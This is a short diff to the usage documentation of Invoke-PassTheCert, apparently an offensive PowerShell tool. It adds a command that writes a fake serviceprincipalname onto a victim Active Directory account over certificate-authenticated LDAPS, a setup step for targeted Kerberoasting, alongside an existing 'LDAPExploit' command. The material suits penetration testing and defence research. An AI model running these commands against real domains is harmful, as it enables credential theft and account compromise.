@@ -61,7 +61,11 @@ Import-Module .\Invoke-PassTheCert.ps1
 $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
 # List all the available actions
 Invoke-PassTheCert -a -NoBanner
-# Add the 'nonexistent/BLAHBLAH' value into the target's serviceprincipalname attribute
+
+# Add the 'nonexistent/BLAHBLAH' value into the target's serviceprincipalname attribute (method 1)
+Invoke-PassTheCert -Action 'AddValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=VICTIM VU. USER,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'nonexistent/BLAHBLAH'
+
+# Add the 'nonexistent/BLAHBLAH' value into the target's serviceprincipalname attribute (method 2, same as method 1)
 Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'Kerberoasting' -Target 'CN=VICTIM VU. USER,CN=Users,DC=X' -SPN 'nonexistent/BLAHBLAH'
 ```
 
